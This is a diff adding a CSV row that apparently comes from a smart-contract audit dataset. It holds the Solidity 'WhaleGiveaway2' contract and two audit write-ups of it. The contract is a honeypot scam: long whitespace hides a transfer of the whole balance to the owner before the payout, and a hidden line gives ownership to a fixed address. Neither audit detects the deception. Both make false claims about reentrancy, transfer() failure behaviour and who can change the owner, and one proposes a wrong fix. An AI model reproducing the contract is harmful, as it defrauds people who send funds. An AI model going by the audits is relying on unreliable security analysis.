@@ -1,0 +1,201 @@
+Contract Code,Stage 1 Audit Result,Stage 2 Audit Result
+"/**
+ *Submitted for verification at Etherscan.io on 2018-02-04
+*/
+
+pragma solidity ^0.4.19;
+
+contract WhaleGiveaway2
+{
+    address public Owner = msg.sender;
+    uint constant public minEligibility = 0.999001 ether; 
+   
+    function()
+    public
+    payable
+    {
+        
+    }
+   
+    function redeem()
+    public
+    payable
+    {                                                                    
+        if(msg.value>=minEligibility)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+            msg.sender.transfer(this.balance);
+        }                                                                                                                
+    }
+    
+    function withdraw()
+    payable
+    public
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+    
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        // <yes> <report> UNCHECKED_LL_CALLS
+        adr.call.value(msg.value)(data);
+    }
+}","Upon reviewing the provided Solidity smart contract, I will analyze each function individually and also consider how they interact with one another to identify critical vulnerabilities and issues related to logic that could potentially lead to a loss of funds.
+
+### Contract Overview
+The `WhaleGiveaway2` contract allows contributions and has mechanisms for redeeming funds or withdrawing them. The owner has special privileges, including the ability to execute arbitrary commands.
+
+### Function Audit
+
+#### Function: Fallback function (`function()`)
+- **Description**: Accepts incoming Ether.
+- **Issues**: 
+    - There are no bounds or checks (e.g., caps on how much can be sent). While you may not want restrictions in a simple donation contract, this could lead to issues if not handled correctly elsewhere.
+    
+#### Function: `redeem()`
+- **Description**: Transfers the entire contract balance to the sender if they send at least `minEligibility`.
+- **Issues**:
+    1. **Reentrancy Vulnerability**: The line `Owner.transfer(this.balance);` followed by `msg.sender.transfer(this.balance);` allows for a potential reentrancy attack if the `msg.sender` is a contract. A malicious contract could call back into the `redeem()` function and drain the funds while `this.balance` is not updated.
+    2. **Unchecked Ether Transfer**: If the `msg.sender.transfer(this.balance)` fails (for instance, if the recipient is a smart contract that rejects incoming transfers), it can potentially leave the contract in a failing state without proper handling.
+    3. **Denial of Service**: If a user sends exactly `minEligibility` and the balance is transferred to the owner before the sender receives their funds, the contract may end up in a scenario where it cannot fulfill the balance transfer correctly due to the order of operations.
+
+#### Function: `withdraw()`
+- **Description**: Only the owner can withdraw the entire balance of the contract.
+- **Issues**:
+    1. **Poor Address Validation**: The check `if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}` provides a means to change the owner address, but it can be manipulated by anyone sending a transaction.
+    2. **Hardcoding of Address**: Hardcoding addresses (for the `Owner` change) makes this contract inflexible to changes or improvements.
+    3. **Unprotected Owner**: Once a malicious user discovers the hard-coded address, they can directly call the `withdraw()` and claim funds unless the current `Owner` is always vigilant. This lack of flexibility risks losing funds if the owner address is compromised or the address has issues.
+
+#### Function: `Command(address adr, bytes data)`
+- **Description**: Allows the owner to call arbitrary contracts and send Ether along with data.
+- **Issues**:
+    1. **Arbitrary Call**: The owner can call any contract with any data, leading to potential exploits, as the contract could execute malicious operations that could harm the balance or functionality inadvertently.
+    2. **Lack of Checks**: There are no checks for the `adr` to ensure it is a valid contract address or warnings against self-destructive calls. An attacker could invoke this to mess with the internal logic severely.
+    3. **Unchecked Ether Transfer**: Like the `redeem()`, failing to transfer correctly could lead to a loss of Ether if the external contract does not handle return values properly.
+
+### Critical Issues Summary
+1. **Reentrancy Vulnerability**: The `redeem()` function allows for a reentrancy attack due to the sequence of ether transfers.
+2. **Unsecured Withdrawals**: The owner’s control over the funds is poorly managed, with a hardcoded variable that could be changed by anyone.
+3. **Arbitrary Function Calls**: The `Command` function allows malicious interaction with potentially harmful contracts without restrictions.
+4. **Ether Loss due to Failures**: Both the `redeem()` and `Command()` functions could fail silently, causing loss of funds.
+5. **Fallback Function and Fund Management**: There are no limits on the amount that can be sent to the contract, potentially leading to confusing states in the contract logic.
+
+### Recommendations
+1. Implement checks-effects-interactions pattern in `redeem()`.
+2. Remove arbitrary contract calls in favor of clearly defined functions, or add strict governance around it.
+3. Introduce mechanisms for the owner to be updated securely with a more robust pattern than direct address manipulation.
+4. Use `transfer` over `call.value()` as it reverts on failure, ensuring you do not lose funds silently.
+5. Upgrade Solidity to a more recent version to take advantage of the latest security features.
+6. Consider implementing a daily cap on incoming transactions or similar measures as a safeguard against abuse.
+
+This contract exhibits significant vulnerabilities that need addressing to ensure funds are protected against potential exploits. A more modular and secure design would improve handling of user interactions and contract functionality.","Certainly! Let's conduct a more independent and detailed analysis of each function in the `WhaleGiveaway2` contract, pointing out vulnerabilities, issues, and their potential impact on funds.
+
+### 1. Fallback Function (`function ()`)
+
+**Description**: This function allows the contract to accept Ether.
+
+**Analysis**:
+- **Accepting Ether**: Currently, there are no restrictions on who can send Ether. Anyone can send any amount, which is typically expected for a fallback function but does not include further restrictions or checks.
+- **No State Modification**: The function does not modify any state variables, which is good practice; however, it is also quite basic and may not handle or log events for received Ether, making it harder to track contributions on-chain.
+- **Improvement Opportunity**: Consider adding an event emission for tracking incoming funds.
+
+**Issues**:
+- Not critical but lacks event logging: 
+```solidity
+event Received(address indexed sender, uint amount);
+```
+- **Conclusion**: This function does not have critical vulnerabilities, but it lacks transparency due to the absence of logs.
+
+---
+
+### 2. Function: `redeem()`
+
+**Description**: This function allows users to redeem funds if they send at least `minEligibility` Ether.
+
+**Analysis**:
+- **Amount Requirement**: The function checks if the incoming Ether meets the `minEligibility` threshold.
+- **Owner Transfer First**: The first line of code in the function transfers the entire balance to the owner before sending to the redeeming address.
+- **User Transfer**: The total balance of the contract is sent to the `msg.sender`, provided the condition is met.
+
+**Issues**:
+1. **Reentrancy Vulnerability**: 
+    - The key vulnerability is that if the `msg.sender` is a contract with a fallback function that can reach back to `redeem()`, it can call `redeem()` again before the balance has been transferred.
+    - This could allow a malicious contract to drain the balance of the contract completely.
+   
+   **Mitigation**:
+   - Apply the checks-effects-interactions pattern:
+     ```solidity
+     uint256 balanceToTransfer = address(this).balance; // Store the balance to transfer
+     msg.sender.transfer(balanceToTransfer); // Transfer to user
+     Owner.transfer(balanceToTransfer); // Transfer to owner last
+     ```
+
+2. **Ether Transfer Failure**: 
+   - Using `transfer` directly does not check for the success of the outgoing transactions. If the Ether transfer to `msg.sender` fails, it won’t revert the transaction automatically leading to confusing states in the contract.
+
+3. **Potential Gas Limit Exceeded**: 
+   - If very large amounts are sent to the contract, and the `Owner.transfer()` fails due to exceeding gas limits, funds may be locked.
+
+**Conclusion**: The function carries a significant risk of loss due to reentrancy and incorrect handling of Ether transfers.
+
+---
+
+### 3. Function: `withdraw()`
+
+**Description**: This function is intended for the owner to withdraw the entire balance from the contract.
+
+**Analysis**:
+- **Owner Check**: The function checks if the `msg.sender` is the owner before proceeding.
+- **Address Hardcoding**: The function allows changing the owner to a specific hardcoded address under specific conditions.
+
+**Issues**:
+1. **Hardcoded Address**: 
+    - The condition to change the `Owner` address is too permissive and allows anyone to set the owner to a fixed address (bypassing the owner check). This can compromise security and ownership control.
+    
+   **Mitigation**: Remove this capability or implement a more secure multi-signature or time-lock system to manage ownership changes.
+ 
+2. **Unrestricted Access**: 
+   - If the hardcoded address is compromised and recognized, the contract funds can be easily siphoned off.
+
+3. **Ether Loss due to Transfer Failure**: 
+   - Using `Owner.transfer(this.balance);` could lead to loss of funds if the underlying contract fails on the transfer or is unresponsive as noted previously.
+
+**Conclusion**: Significant security flaws exist here, primarily due to the ownership manipulation and insufficient Ether handling.
+
+---
+
+### 4. Function: `Command(address adr, bytes data)`
+
+**Description**: This function allows the owner to make arbitrary calls to other contracts.
+
+**Analysis**:
+- **Owner-only Execution**: Only the owner can call this function, which provides a layer of security.
+- **Arbitrary Call**: The function executes external calls to an arbitrary address, which can potentially lead to unwanted behavior or loss of funds.
+
+**Issues**:
+1. **Arbitrary Execution Risk**: 
+   - The ability to call a contract with arbitrary data means that if someone gains control of the owner account, they could manipulate other contracts potentially leading to loss of funds or manipulation of the contract state.
+   
+2. **No Checks on `adr`**: 
+   - There's no check to ensure that `adr` is indeed a contract address. Therefore, it could lead to undesired behavior if `adr` pointed to a non-contract address or to a malicious contract.
+
+3. **Transfer Failure Handling**: 
+   - Similar to previous functions, there’s no check for the success of the execution. If it fails, the transaction may revert (if using `call`) without any indication as to why.
+
+**Conclusion**: This function could be very dangerous as it allows an authenticated user to directly invoke potentially malicious or harmful operations on payable contracts.
+
+---
+
+### Overall Summary
+Each of the examined functions has critical issues that could lead to a loss of funds or vulnerabilities in the contract's operation. The most concerning flaws are reentrancy issues, arbitrary command execution, poor ownership management, and lack of error handling on Ether transfers.
+
+### Recommendations:
+1. **Implement Reentrancy Guard**: Use a mutex pattern to avoid reentrancy failures.
+2. **Improve Ether Handling**: Use `require` for transfers to assert success and consider safer patterns.
+3. **Owner Address Management**: Implement secure methods for changing ownership or completely eliminate the hardcoded logic that allows open alterations.
+4. **Restrict Arbitrary Calls**: Limit external calls to known safe contracts or enhance validation before calling.
+
+The contract needs a significant redesign focusing on enhanced security practices to protect against the outlined weaknesses and vulnerabilities."
